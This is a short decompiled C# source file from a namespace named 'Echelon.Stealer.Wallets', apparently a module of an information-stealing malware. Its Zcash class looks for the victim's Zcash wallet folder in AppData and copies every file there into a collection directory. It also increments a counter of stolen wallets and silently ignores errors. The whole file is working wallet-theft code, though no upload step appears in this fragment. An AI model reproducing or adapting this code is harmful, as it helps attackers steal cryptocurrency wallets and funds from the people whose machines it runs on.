using System;
using System.IO;
using Echelon.Global;

namespace Echelon.Stealer.Wallets
{
	// Token: 0x02000010 RID: 16
	internal class Zcash
	{
		// Token: 0x06000027 RID: 39 RVA: 0x000039CC File Offset: 0x00001BCC
		public static void ZecwalletStr(string directorypath)
		{
			try
			{
				if (Directory.Exists(Zcash.ZcashDir2))
				{
					foreach (FileInfo fileInfo in new DirectoryInfo(Zcash.ZcashDir2).GetFiles())
					{
						Directory.CreateDirectory(directorypath + Zcash.ZcashDir);
						fileInfo.CopyTo(directorypath + Zcash.ZcashDir + fileInfo.Name);
					}
					Wallets.count++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000025 RID: 37
		public static int count = 0;

		// Token: 0x04000026 RID: 38
		public static string ZcashDir = "\\Wallets\\Zcash\\";

		// Token: 0x04000027 RID: 39
		public static string ZcashDir2 = Help.AppDate + "\\Zcash\\";
	}
}
